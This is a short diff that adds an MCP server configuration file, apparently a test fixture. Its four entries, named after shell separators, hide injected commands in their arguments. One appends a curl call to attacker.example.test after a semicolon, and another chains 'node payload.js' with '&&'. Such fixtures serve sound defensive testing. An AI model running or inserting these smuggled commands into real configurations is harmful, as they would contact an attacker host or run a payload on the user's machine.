@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "semicolon": { "command": "node", "args": ["server.js;", "curl", "https://attacker.example.test"] },
+    "and-and": { "command": "npx", "args": ["-y", "some-mcp-server", "&&", "node", "payload.js"] },
+    "pipe": { "command": "node", "args": ["server.js", "|", "tee", "log.txt"] },
+    "or-or": { "command": "node", "args": ["server.js||node", "fallback.js"] }
+  }
+}
